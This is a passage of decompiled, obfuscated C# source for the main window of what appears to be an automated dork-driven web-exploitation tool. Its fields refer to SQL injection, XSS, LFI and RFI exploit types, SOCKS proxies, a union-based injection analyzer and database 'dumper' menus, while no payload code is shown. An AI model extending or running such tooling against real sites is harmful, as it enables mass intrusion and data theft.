using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Chilkat;
using DataBase;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;
using ScrollingBoxCtrl;
using SkinSoft.VisualStyler;
using SkinSoft.VisualStyler.Licensing;
using Taskbar;

[DesignerGenerated]
public class MainForm : Form
{
	internal enum Enum6
	{
		const_0,
		const_1,
		const_2,
		const_3,
		const_4,
		const_5
	}

	internal enum ExploitType
	{
		SQL,
		XSS,
		LFI,
		RFI
	}

	private delegate void Delegate44(string sDesc);

	private delegate bool Delegate45();

	private struct Struct9
	{
		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;
	}

	private sealed class Class48
	{
		public enum Enum7
		{
			const_0 = 0,
			const_1 = 1,
			const_2 = 2,
			const_3 = 4,
			const_4 = 8
		}

		public static int int_0;

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int RegisterHotKey(IntPtr intptr_0, int int_1, int int_2, int int_3);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int UnregisterHotKey(IntPtr intptr_0, int int_1);

		public static void smethod_0(ref Form form_0, string string_0, Enum7 enum7_0)
		{
			RegisterHotKey(form_0.Handle, 1, (int)enum7_0, Strings.Asc(string_0.ToUpper()));
		}

		public static void smethod_1(ref Form form_0)
		{
			UnregisterHotKey(form_0.Handle, 1);
		}

		public static void smethod_2(IntPtr intptr_0)
		{
			if (Globals.GMain.chkGUIHotKey.Checked)
			{
				if (Globals.GMain.Visible)
				{
					Globals.GMain.Hide();
				}
				else
				{
					Globals.GMain.Show();
				}
			}
		}
	}

	private delegate object Delegate46();

	private delegate void Delegate47(ProgressBarStyle p);

	private delegate void Delegate48();

	private struct Struct10
	{
		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;

		public string method_0()
		{
			StringBuilder stringBuilder_ = new StringBuilder();
			method_1(int_3, "SQLi: ", ref stringBuilder_);
			method_1(0, "SQLn: ", ref stringBuilder_);
			method_1(int_0, "LFI: ", ref stringBuilder_);
			method_1(int_1, "RFI: ", ref stringBuilder_);
			method_1(int_2, "XSS: ", ref stringBuilder_);
			if (string.IsNullOrEmpty(stringBuilder_.ToString()))
			{
				stringBuilder_.Append("0");
			}
			return stringBuilder_.ToString();
		}

		private void method_1(int int_5, string string_0, ref StringBuilder stringBuilder_0)
		{
			if (int_5 > 0)
			{
				if (!string.IsNullOrEmpty(stringBuilder_0.ToString()))
				{
					stringBuilder_0.Append(", ");
				}
				stringBuilder_0.Append(string_0 + Globals.FormatNumbers(int_5, bIgnoreZero: false));
			}
		}
	}

	private enum CheckSearchType
	{
		Columns,
		Tables
	}

	private delegate void Delegate49();

	private sealed class Class49
	{
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private int int_0;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private Thread thread_0;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private DataGridViewRow dataGridViewRow_0;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string string_0;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private int int_1;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private Analyzer analyzer_0;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private bool bool_0;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string string_1;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private CheckSearchType checkSearchType_0;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private int int_2;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private bool bool_1;

		public int Int32_0
		{
			[CompilerGenerated]
			get
			{
				return int_0;
			}
			[CompilerGenerated]
			set
			{
				int_0 = value;
			}
		}

		public Thread Thread
		{
			[CompilerGenerated]
			get
			{
				return thread_0;
			}
			[CompilerGenerated]
			set
			{
				thread_0 = value;
			}
		}

		public DataGridViewRow Item
		{
			[CompilerGenerated]
			get
			{
				return dataGridViewRow_0;
			}
			[CompilerGenerated]
			set
			{
				dataGridViewRow_0 = value;
			}
		}

		public string String_0
		{
			[CompilerGenerated]
			get
			{
				return string_0;
			}
			[CompilerGenerated]
			set
			{
				string_0 = value;
			}
		}

		public int Retry
		{
			[CompilerGenerated]
			get
			{
				return int_1;
			}
			[CompilerGenerated]
			set
			{
				int_1 = value;
			}
		}

		public Analyzer o
		{
			[CompilerGenerated]
			get
			{
				return analyzer_0;
			}
			[CompilerGenerated]
			set
			{
				analyzer_0 = value;
			}
		}

		public bool CurrentDB
		{
			[CompilerGenerated]
			get
			{
				return bool_0;
			}
			[CompilerGenerated]
			set
			{
				bool_0 = value;
			}
		}

		public string Search
		{
			[CompilerGenerated]
			get
			{
				return string_1;
			}
			[CompilerGenerated]
			set
			{
				string_1 = value;
			}
		}

		public CheckSearchType SearchType
		{
			[CompilerGenerated]
			get
			{
				return checkSearchType_0;
			}
			[CompilerGenerated]
			set
			{
				checkSearchType_0 = value;
			}
		}

		public int Count
		{
			[CompilerGenerated]
			get
			{
				return int_2;
			}
			[CompilerGenerated]
			set
			{
				int_2 = value;
			}
		}

		public bool AllResults
		{
			[CompilerGenerated]
			get
			{
				return bool_1;
			}
			[CompilerGenerated]
			set
			{
				bool_1 = value;
			}
		}

		public Class49()
		{
			AllResults = true;
		}
	}

	private delegate void Delegate50(object sender, DoWorkEventArgs e);

	private delegate long Delegate51(string sURL, string sProxy);

	private delegate void Delegate52(long long_0, string sURL, string sSize, string sReponse, string sStatus, string sLog);

	private IContainer icontainer_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("twMain")]
	private TreeViewExt _twMain;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("tslNotepad")]
	private ToolStrip toolStrip_0;

	[AccessedThroughProperty("btnNotepadOpen")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripButton toolStripButton_0;

	[CompilerGenerated]
	[AccessedThroughProperty("toolStripSeparator5")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripSeparator toolStripSeparator_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("btnNotepadSave")]
	[CompilerGenerated]
	private ToolStripButton toolStripButton_1;

	[CompilerGenerated]
	[AccessedThroughProperty("toolStripSeparator7")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripSeparator toolStripSeparator_1;

	[CompilerGenerated]
	[AccessedThroughProperty("btnNotepadClear")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripButton toolStripButton_2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripLabel3")]
	private ToolStripLabel toolStripLabel_0;

	[AccessedThroughProperty("mnuListView")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ContextMenuStrip _mnuChecked;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mnuLWClipboard")]
	private ToolStripMenuItem _mnuLWClipboard;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuLWSelectAll")]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuLWSelectAll;

	[AccessedThroughProperty("mnuLWExport")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuLWExport;

	[CompilerGenerated]
	[AccessedThroughProperty("mnuLWRemove")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuLWRemove;

	[AccessedThroughProperty("imgData")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ImageList imageList_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("bcWorker")]
	[CompilerGenerated]
	private BackgroundWorker backgroundWorker_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("btnSocksAppend")]
	private ToolStripButton _btnSocksAppend;

	[AccessedThroughProperty("btnSocksClear")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripButton _btnSocksClear;

	[CompilerGenerated]
	[AccessedThroughProperty("btnSocksTest")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripButton _btnSocksTest;

	[AccessedThroughProperty("btnSocksNew")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripButton _btnSocksNew;

	[AccessedThroughProperty("mnuSocks")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ContextMenuStrip _mnuChecked_1;

	[CompilerGenerated]
	[AccessedThroughProperty("mnuSocksSelectAll")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuSocksSelectAll;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mnuSocksRemove")]
	private ToolStripMenuItem _mnuSocksRemove;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mnuSocksCheck")]
	private ToolStripMenuItem _mnuSocksCheck;

	[AccessedThroughProperty("mnuSocksUnCheck")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuSocksUnCheck;

	[CompilerGenerated]
	[AccessedThroughProperty("chkSkin")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private CheckBox _chkSkin;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("cmbSkin")]
	private ComboBox _cmbSkin;

	[AccessedThroughProperty("btnSkinN")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Button _btnSkinN;

	[AccessedThroughProperty("btnSkinP")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Button _btnSkinP;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuAboutClipboard")]
	private ToolStripMenuItem _mnuAboutClipboard;

	[CompilerGenerated]
	[AccessedThroughProperty("txtMultiDorks")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private TextBox _txtMultiDorks;

	[AccessedThroughProperty("lstSearchEngine")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private CheckedListBox _lstSearchEngine;

	[AccessedThroughProperty("mnuHttpLog")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ContextMenuStrip _mnuChecked_6;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuHttpLogClear")]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuHttpLogClear;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuHttpLogAutoScroll")]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuHttpLogAutoScroll;

	[AccessedThroughProperty("txtExcludeUrlWords")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private TextBox _txtExcludeUrlWords;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("lblDownloads")]
	private ToolStripStatusLabel _lblDownloads;

	[CompilerGenerated]
	[AccessedThroughProperty("mnuQueue")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ContextMenuStrip _mnuChecked_4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuQueueClipboard")]
	private ToolStripMenuItem _mnuQueueClipboard;

	[AccessedThroughProperty("mnuQueueSelectAll")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuQueueSelectAll;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mnuQueueRomove")]
	private ToolStripMenuItem _mnuQueueRomove;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuQueueShell")]
	private ToolStripMenuItem _mnuQueueShell;

	[AccessedThroughProperty("lstExcludeUrlWords")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ListBox _lstExcludeUrlWords;

	[CompilerGenerated]
	[AccessedThroughProperty("btnExcludeUrlWords")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Button _btnExcludeUrlWords;

	[CompilerGenerated]
	[AccessedThroughProperty("mnuExcludeUrlWordsRemove")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuExcludeUrlWordsRemove;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("btnFileInclusaoSearchClear")]
	private ToolStripButton _btnFileInclusaoSearchClear;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("btnFileInclusaoSearch")]
	[CompilerGenerated]
	private ToolStripButton _btnFileInclusaoSearch;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("VisualStyler1")]
	private VisualStyler visualStyler_0;

	[CompilerGenerated]
	[AccessedThroughProperty("txtRFIurl")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private TextBox _txtRFIurl;

	[CompilerGenerated]
	[AccessedThroughProperty("txtRFIkeyword")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private TextBox _txtRFIkeyword;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuTrash")]
	private ContextMenuStrip _mnuChecked_5;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuTrashClippboard")]
	private ToolStripMenuItem _mnuTrashClippboard;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuTrashSelectAll")]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuTrashSelectAll;

	[AccessedThroughProperty("mnuTrashClearAll")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuTrashClearAll;

	[AccessedThroughProperty("mnuTrashRemove")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuTrashRemove;

	[AccessedThroughProperty("cmbGUIHotKey")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ComboBox _cmbGUIHotKey;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("chkGUIHotKey")]
	private CheckBox _chkGUIHotKey;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("ntfTray")]
	private NotifyIcon notifyIcon_0;

	[AccessedThroughProperty("btnSettingSave")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Button _btnSettingSave;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("btnSettingReLoad")]
	private Button _btnSettingReLoad;

	[CompilerGenerated]
	[AccessedThroughProperty("btnSettingReset")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Button _btnSettingReset;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("lstExpoitType")]
	[CompilerGenerated]
	private CheckedListBox _lstExpoitType;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuTrashRefresh")]
	private ToolStripMenuItem _mnuTrashRefresh;

	[AccessedThroughProperty("mnuHttpLogDock")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuHttpLogDock;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("numThreads")]
	private NumericUpDown _numThreads;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ColumnHeader5")]
	[CompilerGenerated]
	private ColumnHeader columnHeader_0;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader7")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ColumnHeader columnHeader_1;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader8")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ColumnHeader columnHeader_2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ColumnHeader9")]
	private ColumnHeader columnHeader_3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuPaths")]
	private ContextMenuStrip _mnuChecked_7;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mnuPathAdd")]
	private ToolStripMenuItem _mnuPathAdd;

	[AccessedThroughProperty("mnuPathEdit")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuPathEdit;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuPathRem")]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuPathRem;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("chkLfiWindowsSkip")]
	private CheckBox _chkLfiWindowsSkip;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ColumnHeader11")]
	[CompilerGenerated]
	private ColumnHeader columnHeader_4;

	[AccessedThroughProperty("ColumnHeader12")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ColumnHeader columnHeader_5;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("txtUserAgent")]
	private TextBox _txtUserAgent;

	[CompilerGenerated]
	[AccessedThroughProperty("txtAccept")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private TextBox _txtAccept;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuLWShell")]
	private ToolStripMenuItem _mnuLWShell;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("numAnalizerUnionEnd")]
	private NumericUpDown _numAnalizerUnionEnd;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("numAnalizerUnionSart")]
	private NumericUpDown _numAnalizerUnionSart;

	[AccessedThroughProperty("lstAnalizerUnion")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private CheckedListBox _lstAnalizerUnion;

	[CompilerGenerated]
	[AccessedThroughProperty("lstAnalizerError")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private CheckedListBox _lstAnalizerError;

	[CompilerGenerated]
	[AccessedThroughProperty("txtAnalizerExploitCode")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private TextBox _txtAnalizerExploitCode;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("btnSQLiSearchClear")]
	private ToolStripButton _btnSQLiSearchClear;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("btnSQLiSearch")]
	[CompilerGenerated]
	private ToolStripButton _btnSQLiSearch;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("btnSQLiNoInjectableSearchClear")]
	[CompilerGenerated]
	private ToolStripButton _btnSQLiNoInjectableSearchClear;

	[CompilerGenerated]
	[AccessedThroughProperty("btnSQLiNoInjectableSearch")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripButton _btnSQLiNoInjectableSearch;

	[AccessedThroughProperty("btnSocksMyIP")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripButton _btnSocksMyIP;

	[AccessedThroughProperty("cmbSearchColumn")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripComboBox _cmbSearchColumn;

	[AccessedThroughProperty("mnuSearchColumn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ContextMenuStrip _mnuChecked_9;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuSearchColumnClear")]
	private ToolStripMenuItem _mnuSearchColumnClear;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuSearchColumnRem")]
	private ToolStripMenuItem _mnuSearchColumnRem;

	[AccessedThroughProperty("mnuLWGoDumper")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuLWGoDumper;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mnuLWGoNewDumper")]
	private ToolStripMenuItem _mnuLWGoNewDumper;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mnuLWGoFileDumper")]
	private ToolStripMenuItem _mnuLWGoFileDumper;

	[AccessedThroughProperty("mnuDownloadsClear")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuDownloadsClear;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("txtFileInclusaoSearch")]
	[CompilerGenerated]
	private ToolStripComboBox _txtFileInclusaoSearch;

	[CompilerGenerated]
	[AccessedThroughProperty("txtSQLiNoInjectableSearch")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripComboBox _txtSQLiNoInjectableSearch;

	[AccessedThroughProperty("txtSQLiSearch")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripComboBox _txtSQLiSearch;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuLWAutoScroll")]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuLWAutoScroll;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuQueueTrash")]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuQueueTrash;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuLWTrash")]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuLWTrash;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mnuHttpLogShell")]
	private ToolStripMenuItem _mnuHttpLogShell;

	[AccessedThroughProperty("mnuHttpLogClipboard")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuHttpLogClipboard;

	[AccessedThroughProperty("btnPing")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Button _btnPing;

	[AccessedThroughProperty("btnResolve")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Button _btnResolve;

	[AccessedThroughProperty("txtResolveAddress")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private TextBox _txtResolveAddress;

	[AccessedThroughProperty("txtSQLCharDelimiter")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private TextBox _txtSQLCharDelimiter;

	[AccessedThroughProperty("txtTextValue")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private TextBox _txtTextValue;

	[AccessedThroughProperty("btnConvertTextToHex")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Button _btnConvertTextToHex;

	[AccessedThroughProperty("txtHexValue")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private TextBox _txtHexValue;

	[AccessedThroughProperty("btnHexToText")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Button _btnHexToText;

	[AccessedThroughProperty("chkGroupChar")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private CheckBox _chkGroupChar;

	[AccessedThroughProperty("butTextToSQLChar")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Button _butTextToSQLChar;

	[AccessedThroughProperty("btnURLDecondingToText")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Button _btnURLDecondingToText;

	[AccessedThroughProperty("btnTextToURLEnconding")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Button _btnTextToURLEnconding;

	[AccessedThroughProperty("btnBase64ToText")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Button _btnBase64ToText;

	[AccessedThroughProperty("btnTextToBase64")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Button _btnTextToBase64;

	[AccessedThroughProperty("btnToolsClean")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Button _btnToolsClean;

	[AccessedThroughProperty("ColumnHeader32")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ColumnHeader columnHeader_6;

	[AccessedThroughProperty("ColumnHeader33")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ColumnHeader columnHeader_7;

	[AccessedThroughProperty("mnuScannerDomain")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ContextMenuStrip _mnuChecked_8;

	[AccessedThroughProperty("ScannerDomainEdit")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _ScannerDomainEdit;

	[AccessedThroughProperty("ColumnHeader34")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ColumnHeader columnHeader_8;

	[AccessedThroughProperty("ColumnHeader35")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ColumnHeader columnHeader_9;

	[AccessedThroughProperty("btnUpdater")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Button _btnUpdater;

	[AccessedThroughProperty("chkUpdater")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private CheckBox _chkUpdater;

	[AccessedThroughProperty("cmbSearchColumnType")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripComboBox _cmbSearchColumnType;

	[AccessedThroughProperty("numSearchColumnThreads")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private NumericUpDown _numSearchColumnThreads;

	[AccessedThroughProperty("mnuLWAlexa")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuLWAlexa;

	[AccessedThroughProperty("bckAlexa")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private BackgroundWorker backgroundWorker_1;

	[AccessedThroughProperty("cmbLanguages")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ComboBox _cmbLanguages;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader36")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ColumnHeader columnHeader_10;

	[AccessedThroughProperty("ColumnHeader37")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ColumnHeader columnHeader_11;

	[AccessedThroughProperty("bckImport")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private BackgroundWorker backgroundWorker_2;

